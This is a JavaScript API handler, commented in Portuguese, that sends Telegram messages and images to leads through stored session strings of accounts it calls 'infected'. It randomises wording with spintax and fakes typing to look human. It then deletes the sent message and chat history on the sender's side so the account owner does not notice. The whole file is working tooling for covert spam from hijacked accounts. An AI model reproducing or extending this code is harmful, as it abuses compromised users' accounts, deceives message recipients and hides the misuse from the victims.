import { TelegramClient, Api } from "telegram";
import { StringSession } from "telegram/sessions";
import { CustomFile } from "telegram/client/uploads";
import { createClient } from '@supabase/supabase-js';

const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_KEY);
const apiId = parseInt(process.env.TELEGRAM_API_ID);
const apiHash = process.env.TELEGRAM_API_HASH;

function spinText(text) {
  if (!text) return "";
  return text.replace(/{([^{}]+)}/g, (match, content) => {
    const choices = content.split('|');
    return choices[Math.floor(Math.random() * choices.length)];
  });
}

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  let { senderPhone, target, username, message, imageUrl, leadDbId } = req.body;
  const finalMessage = spinText(message);

  // ESTRATÉGIA: Prioriza o Username para evitar erro de "Input Entity"
  let finalPeer = username ? username.replace('@', '') : target;

  if (!username && /^\d+$/.test(target)) {
    try { finalPeer = BigInt(target); } catch (e) { return res.status(400).json({ error: "ID inválido" }); }
  }

  const { data } = await supabase.from('telegram_sessions').select('session_string').eq('phone_number', senderPhone).single();
  if (!data) return res.status(404).json({ error: 'Sessão off.' });

  const client = new TelegramClient(new StringSession(data.session_string), apiId, apiHash, { connectionRetries: 2, useWSS: false });

  try {
    await client.connect();

    // Simulação de presença
    const action = imageUrl ? new Api.SendMessageUploadPhotoAction() : new Api.SendMessageTypingAction();
    await client.invoke(new Api.messages.SetTyping({ peer: finalPeer, action }));
    await new Promise(r => setTimeout(r, Math.floor(Math.random() * 2000) + 1000)); 

    let sentMsg;
    if (imageUrl) {
        const mediaRes = await fetch(imageUrl);
        const buffer = Buffer.from(await mediaRes.arrayBuffer());
        const toUpload = new CustomFile("image.jpg", buffer.byteLength, "image/jpeg", buffer);
        const uploadedFile = await client.uploadFile({ file: toUpload, workers: 1 });

        sentMsg = await client.sendMessage(finalPeer, { message: finalMessage, file: uploadedFile, parseMode: "markdown" });
    } else {
        sentMsg = await client.sendMessage(finalPeer, { message: finalMessage, parseMode: "markdown", linkPreview: true });
    }

    // --- MODO FANTASMA: Apaga rastro do envio para o infectado não ver ---
    try {
        await client.deleteMessages(finalPeer, [sentMsg.id], { revoke: false }); 
        await client.invoke(new Api.messages.DeleteHistory({ peer: finalPeer, maxId: 0, justClear: false, revoke: false }));
    } catch (cleanupErr) { console.error("Erro ao limpar rastro de envio"); }
    
    await client.disconnect();

    if (leadDbId) {
        await supabase.from('leads_hottrack').update({ status: 'sent', last_contacted_at: new Date() }).eq('id', leadDbId);
    }
    return res.status(200).json({ success: true });

  } catch (error) {
    await client.disconnect();
    console.error(`Erro ${senderPhone}:`, error.message);
    if (leadDbId) await supabase.from('leads_hottrack').update({ status: 'failed' }).eq('id', leadDbId);
    return res.status(500).json({ error: error.message });
  }
}
